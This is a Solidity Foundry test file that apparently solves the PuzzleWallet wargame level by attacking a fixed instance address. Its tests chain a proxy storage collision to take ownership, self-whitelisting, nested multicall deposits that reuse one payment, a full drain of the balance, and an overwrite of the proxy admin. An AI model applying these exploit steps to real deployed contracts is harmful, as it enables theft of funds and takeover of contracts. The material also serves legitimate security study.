// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import { IPuzzleWallet } from "src/24_PuzzleWallet/IPuzzleWallet.sol";
import { PuzzleWalletSolution } from "src/24_PuzzleWallet/PuzzleWalletSolution.sol";

contract PuzzleWalletTest is Test {

    IPuzzleWallet puzzleWallet;
    PuzzleWalletSolution puzzleWalletSolution;
    address instanceAddress = 0xe8C34443499BEE50b3b5631bD3e8bfa974ff9613;
    address user = 0x6f31C2943866bFA792884F6579906BeE388D1C7A;


    function setUp() public {
        puzzleWallet = IPuzzleWallet(instanceAddress);
        puzzleWalletSolution = new PuzzleWalletSolution();
    }

    function testOwner() public {
        address owner = puzzleWallet.owner();
        assertFalse(owner == address(0), "Owner should not be zero address");
    }

    function testOwnerEqualsPendingAdmin() public {
        address owner = puzzleWallet.owner();
        address pendingAdmin = puzzleWallet.pendingAdmin();
        assertEq(owner, pendingAdmin, "Owner and pendingAdmin should be the same due to storage collision");
    }

    function testChangeOwnerByProposingNewAdmin() public {
        address newOwner = address(this);
        puzzleWallet.proposeNewAdmin(newOwner);
        assertEq(puzzleWallet.owner(), newOwner, "Owner should be changed by call to pendingAdmin");
    }

    function testCanWhitelistMyself() public {
        address newOwner = address(this);
        emit log_named_uint("contract balance", address(puzzleWallet).balance);
        puzzleWallet.proposeNewAdmin(newOwner);
        assertEq(puzzleWallet.owner(), newOwner, "Owner should be changed by call to pendingAdmin");
        puzzleWallet.addToWhitelist(newOwner);
        assertTrue(puzzleWallet.whitelisted(newOwner), "New owner should be whitelisted");
    }

    function testDepositMultipleTimes() public {
        address newOwner = address(this);
        puzzleWallet.proposeNewAdmin(newOwner);
        puzzleWallet.addToWhitelist(newOwner);

        bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
        bytes[] memory depositCalldataArray = new bytes[](1);
        depositCalldataArray[0] = depositCalldata;
        bytes memory multicallCalldata = abi.encodeWithSignature("multicall(bytes[])", depositCalldataArray);
        bytes[] memory multicallCalldataArray = new bytes[](2);
        multicallCalldataArray[0] = multicallCalldata;
        multicallCalldataArray[1] = multicallCalldata;

        puzzleWallet.multicall{value: address(puzzleWallet).balance}(multicallCalldataArray);
        assertEq(puzzleWallet.balances(address(this)), address(puzzleWallet).balance, "User balance should be equal to contract balance");
    }

    function testWithdrawContractBalance() public {
        address newOwner = address(this);
        puzzleWallet.proposeNewAdmin(newOwner);
        puzzleWallet.addToWhitelist(newOwner);

        bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
        bytes[] memory depositCalldataArray = new bytes[](1);
        depositCalldataArray[0] = depositCalldata;
        bytes memory multicallCalldata = abi.encodeWithSignature("multicall(bytes[])", depositCalldataArray);
        bytes[] memory multicallCalldataArray = new bytes[](2);
        multicallCalldataArray[0] = multicallCalldata;
        multicallCalldataArray[1] = multicallCalldata;

        puzzleWallet.multicall{value: address(puzzleWallet).balance}(multicallCalldataArray);
        assertEq(puzzleWallet.balances(address(this)), address(puzzleWallet).balance, "User balance should be equal to contract balance");

        bytes memory withdrawCalldata;
        puzzleWallet.execute(address(this), address(puzzleWallet).balance, withdrawCalldata);
        assertEq(address(puzzleWallet).balance, 0, "Contract should be drained");
    }

    function testHijack() public {
        address newOwner = address(this);
        puzzleWallet.proposeNewAdmin(newOwner);
        puzzleWallet.addToWhitelist(newOwner);

        bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
        bytes[] memory depositCalldataArray = new bytes[](1);
        depositCalldataArray[0] = depositCalldata;
        bytes memory multicallCalldata = abi.encodeWithSignature("multicall(bytes[])", depositCalldataArray);
        bytes[] memory multicallCalldataArray = new bytes[](2);
        multicallCalldataArray[0] = multicallCalldata;
        multicallCalldataArray[1] = multicallCalldata;

        puzzleWallet.multicall{value: address(puzzleWallet).balance}(multicallCalldataArray);
        assertEq(puzzleWallet.balances(address(this)), address(puzzleWallet).balance, "User balance should be equal to contract balance");

        bytes memory withdrawCalldata;
        puzzleWallet.execute(address(this), address(puzzleWallet).balance, withdrawCalldata);
        assertEq(address(puzzleWallet).balance, 0, "Contract should be drained");

        uint newOwnerUint = uint(uint160(newOwner));
        bytes32 newOwnerBytes32 = bytes32(newOwnerUint);
        emit log_named_bytes32("newOwnerBytes32", newOwnerBytes32);
        puzzleWallet.setMaxBalance(newOwnerUint);

        assertEq(puzzleWallet.admin(), newOwner, "Admin should be changed by call to setMaxBalance");
    }

    function testSolutionContract() public {
        puzzleWalletSolution.hijack{value: address(puzzleWallet).balance}(puzzleWallet, payable(tx.origin));
        assertEq(puzzleWallet.admin(), tx.origin, "Admin should be changed by call to setMaxBalance");
    }

    receive() external payable {
        emit log_named_uint("received", msg.value);
    }

}
